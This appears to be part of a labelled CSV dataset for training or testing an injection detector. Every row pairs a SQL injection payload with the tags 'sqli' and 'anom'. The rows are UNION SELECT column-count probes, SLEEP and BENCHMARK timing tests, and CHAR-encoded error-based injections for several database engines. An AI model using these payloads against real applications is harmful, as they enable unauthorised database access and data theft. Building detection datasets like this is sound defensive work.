+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),""'3",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),""'3'""#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),4#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",sqli,anom
+" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sqli,anom
+ UNION ALL SELECT USER()-- ,sqli,anom
+ UNION ALL SELECT SLEEP(5)-- ,sqli,anom
+" UNION ALL SELECT USER(),SLEEP(5)-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sqli,anom
+ UNION ALL SELECT NULL-- ,sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- ",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- ",sqli,anom
+ UNION ALL SELECT NULL#,sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",sqli,anom
+ UNION ALL SELECT NULL ,sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",sqli,anom
+" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",sqli,anom
+" AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",sqli,anom
+ AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC),sqli,anom
+" AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",sqli,anom
+" UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- ",sqli,anom
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sqli,anom
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- ,sqli,anom
+" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- ",sqli,anom
